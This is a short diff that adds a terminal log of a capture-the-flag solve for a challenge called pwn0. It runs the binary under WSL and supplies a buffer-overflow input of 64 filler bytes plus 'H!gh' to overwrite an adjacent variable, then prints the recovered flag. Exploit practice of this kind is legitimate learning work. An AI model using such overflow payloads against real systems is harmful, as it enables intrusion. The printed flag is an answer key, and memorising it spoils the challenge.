@@ -1,0 +1,5 @@
+$ cd "/c/Users/Andre/Documents/2_enc_pwn0"
+$ wsl
+./pwn0
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaH!gh 64(buffer)+4(josh)
+encryptCTF{L3t5_R4!53_7h3_J05H}
